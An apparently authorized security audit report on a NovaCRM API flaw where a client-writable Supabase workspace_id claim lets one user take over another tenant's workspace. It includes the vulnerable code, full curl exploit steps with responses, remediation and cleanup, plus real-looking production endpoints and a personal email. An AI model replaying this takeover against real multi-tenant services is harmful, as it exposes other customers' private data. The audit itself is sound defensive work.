# Target B2 — Self-Service Cross-Tenant Workspace Takeover

**Verdict: PROVEN (read + write cross-tenant data access)**
**Date:** 2026-06-03
**Auth:** Authorized internal security validation against owner's own NovaCRM infra.
**Evidence file:** /tmp/novacrm-audit/phase2/evidence-takeover.md

## Targets / endpoints
- API (prod): `https://api-production-c080.up.railway.app` (Railway, RAILWAY_ENVIRONMENT=production)
- Supabase: `https://ilfibxflnelssllgszex.supabase.co`
- Health: `GET /health -> {"status":"ok","database":"ok","redis":"ok"}`
- Supabase auth settings: email signup enabled, `disable_signup=false`, `mailer_autoconfirm=false`.

## Root cause (code)
`/tmp/crm-signup-fix/apps/api/app/routers/auth.py` `POST /auth/verify`, reconcile branch (lines 100-109):

```python
# Reconcile: if the JWT now carries a different workspace_id ... update our DB row.
if meta_ws_id_str and meta_ws_id_str != str(user.workspace_id):
    try:
        new_ws_id = uuid.UUID(meta_ws_id_str)
        user.workspace_id = new_ws_id  # <-- NO authz that user belongs to new_ws_id
        await db.commit()
```

`meta_ws_id_str` comes from `payload["user_metadata"]["workspace_id"]` (line 75-76), i.e. the
Supabase `user_metadata` claim. `user_metadata` is writable by the end user via the standard
GoTrue `updateUser` path (`PUT /auth/v1/user`). There is no check that the caller is a member
of `new_ws_id`. Every workspace-scoped endpoint (contacts/deals/workspaces routers) then guards
with `current_user.workspace_id != workspace_id -> 403`, so once the DB row's workspace_id is
overwritten, those guards pass for the victim workspace.

(Same untrusted-metadata pattern also exists in `dependencies.py get_current_user`
auto-provision path, lines 44-77, for first-login users.)

---

## Step 1 — Admin-create two confirmed test users

Command:
```
curl -s -X POST "$SB/auth/v1/admin/users" -H "apikey: $SVC" -H "Authorization: Bearer $SVC" \
  -H "Content-Type: application/json" \
  -d '{"email":"rippere.ben.r+p2-takeover-A@gmail.com","password":"<pw>","email_confirm":true}'
# (and ...+p2-takeover-B@gmail.com)
```
Observed (HTTP 200 both):
- User A id = `777444c5-7dfa-43ec-b43e-b156acceda68`, email_confirmed_at set.
- User B id = `e4932832-be06-41a6-9d32-afa9bc0d841f`, email_confirmed_at set.

### Provision a REAL workspace for B (the way the web app onboarding does)

1b. Sign B in (password grant) -> HTTP 200, access_token obtained. B's initial JWT
`user_metadata = {"email_verified": true}` (NO workspace_id).

1c. `POST /auth/verify` as B (auto-provisions default ws + DB user row):
```
{"user_id":"20dc6d1d-2240-44fe-bd9c-d09f3cbe37bd","workspace_id":"f54dbd3f-54cc-4961-9375-f8cd415ac044"}
```

1d. B creates the onboarding workspace via `POST /workspaces` (HTTP 201):
```
{"id":"aad3b40a-2476-46f4-b591-e3b17c15591c","name":"Victim B Corp","slug":"victimb-p2takeover","mode":"sales"}
```
=> **B's victim workspace WS_B = `aad3b40a-2476-46f4-b591-e3b17c15591c`**

1e. Re-sign-in B, `POST /auth/verify` again -> DB user.workspace_id reconciled to WS_B:
```
{"user_id":"20dc6d1d-2240-44fe-bd9c-d09f3cbe37bd","workspace_id":"aad3b40a-2476-46f4-b591-e3b17c15591c"}
```

1f. Seed a contact in WS_B (HTTP 201):
```
{"id":"622f54f2-925e-4d97-9547-afc526d9f2ef","workspace_id":"aad3b40a-...","name":"SECRET Victim Contact",
 "email":"secret-victim@victimb.example","company":"Victim B Corp",...}
```

1g. Seed a deal in WS_B (HTTP 201):
```
{"id":"3ef2a69c-30ab-471b-994b-5e3cad37733f","workspace_id":"aad3b40a-...",
 "title":"SECRET Victim Deal - 5M ARR","value":5000000.0,"stage":"negotiation",...}
```

---

## Step 2 — As user A, overwrite A's own metadata to B's workspace_id (PIVOTAL)

2a. Sign A in (password grant) -> HTTP 200.
2a'. Baseline `POST /auth/verify` as A -> A's OWN legit workspace:
```
{"user_id":"a380bf0e-8082-49a8-ab4e-16d27b3ce06e","workspace_id":"cbf521d3-791f-4ed3-b58c-f9aa46806ba7"}
```
=> A's own workspace WS_A = `cbf521d3-...` (DIFFERENT from victim WS_B `aad3b40a-...`).

2b. THE PIVOTAL WRITE — GoTrue updateUser client path:
```
curl -s -X PUT "$SB/auth/v1/user" \
  -H "apikey: $ANON" -H "Authorization: Bearer <A_access_token>" -H "Content-Type: application/json" \
  -d '{"data":{"workspace_id":"aad3b40a-2476-46f4-b591-e3b17c15591c"}}'
```
Observed: **HTTP 200**. GoTrue ACCEPTED the user_metadata write. Returned user object:
```
"user_metadata":{"email_verified":true,"workspace_id":"aad3b40a-2476-46f4-b591-e3b17c15591c"}
```
=> The Supabase project does **NOT** lock self-service `user_metadata` writes. A successfully
self-asserted B's workspace_id into A's own metadata. **The attack does NOT fail here.**

---

## Step 3 — Fresh A token, /auth/verify, then read B's data as A

3a. Fresh A token (password grant). Decoded A JWT now carries:
```
meta.workspace_id = aad3b40a-2476-46f4-b591-e3b17c15591c   (B's ws)
sub               = 777444c5-7dfa-43ec-b43e-b156acceda68   (A)
```

3b. `POST /auth/verify` as A -> reconcile branch fires, binds A's DB row to WS_B:
```
{"user_id":"a380bf0e-...","workspace_id":"aad3b40a-2476-46f4-b591-e3b17c15591c"}   # == VICTIM WS_B
```

3c. `GET /me` as A confirms DB binding:
```
{"id":"a380bf0e-...","email":"...+p2-takeover-a@gmail.com",
 "workspace_id":"aad3b40a-2476-46f4-b591-e3b17c15591c","role":"admin"}
```

3d. ATTACK READ — `GET /workspaces/aad3b40a-.../contacts` as A -> **HTTP 200**, returns B's row:
```
[{"id":"622f54f2-925e-4d97-9547-afc526d9f2ef","workspace_id":"aad3b40a-...",
  "name":"SECRET Victim Contact","email":"secret-victim@victimb.example","company":"Victim B Corp",...}]
```

3e. ATTACK READ — `GET /workspaces/aad3b40a-.../deals` as A -> **HTTP 200**, returns B's row:
```
[{"id":"3ef2a69c-30ab-471b-994b-5e3cad37733f","workspace_id":"aad3b40a-...",
  "title":"SECRET Victim Deal - 5M ARR","value":5000000.0,"stage":"negotiation",...}]
```

=> **CROSS-TENANT TAKEOVER PROVEN.** User A read user B's private contacts and deals.

### Impact also includes WRITE (not read-only)
3f. `POST /workspaces/aad3b40a-.../contacts` as A -> **HTTP 201**, injected into B's ws:
```
{"id":"d05ee9f3-8c19-42ba-a51a-3e0a5f076063","workspace_id":"aad3b40a-...",
 "name":"ATTACKER-A-injected-DELETEME","email":"attacker-a@evil.example","company":"pwned",...}
```

### Negative control (proves the guard otherwise works)
`GET /workspaces/11111111-2222-3333-4444-555555555555/contacts` as A (a ws A never asserted):
```
{"detail":"Access denied"}   HTTP 403
```
=> The 403 guard is real; only the self-asserted metadata write defeats it.

---

## Exploitability summary
- Preconditions: attacker can sign up / has any account (open email signup), and knows or
  guesses a target `workspace_id` (UUID v4). Workspace IDs leak in API responses, invite
  flows, and onboarding payloads. With a known/leaked target ws UUID, takeover is single-user,
  fully self-service, no admin/service credentials required by the attacker.
- Attacker uses only: GoTrue `PUT /auth/v1/user` (anon-key + own token) + normal API calls.
- Yields full read AND write to the victim tenant's contacts/deals (and any workspace-scoped
  resource), as role=admin.

## Remediation
- Do NOT trust `user_metadata.workspace_id` for authorization. Remove the `/auth/verify`
  reconcile that writes `user.workspace_id` from JWT metadata (auth.py:100-109) and the
  equivalent auto-provision read in dependencies.py:44-77.
- Source workspace membership only from a server-controlled membership table
  (users/workspace_members) that the user cannot write. Move workspace_id into
  `app_metadata` (admin-only writable) if a claim is needed, and/or enforce a
  membership join on every workspace-scoped query.
- Optionally lock self-service metadata writes, but defense-in-depth: the server must
  not derive tenancy from any client-writable field regardless.

---

## CLEANUP (all verified)
DB (single transaction, scoped to the 3 test workspaces + 2 test users):
```
DELETE 3 activity_events; DELETE 1 deals; DELETE 2 contacts; DELETE 21 agents;
DELETE 2 users; DELETE 3 workspaces; COMMIT
```
Post-cleanup verification — all residual counts = 0:
```
activity_events 0 | agents 0 | contacts 0 | deals 0 | users 0 (by ws and by supabase_uid) | workspaces 0
```
Supabase auth users:
```
DELETE A -> 200 ; DELETE B -> 200
GET A -> 404 ; GET B -> 404
email filter A -> 0 users ; email filter B -> 0 users
```
=> No test data left behind. No production/real data touched (the negative-control random ws
returned 403; all writes were into the namespaced test workspace, then deleted).
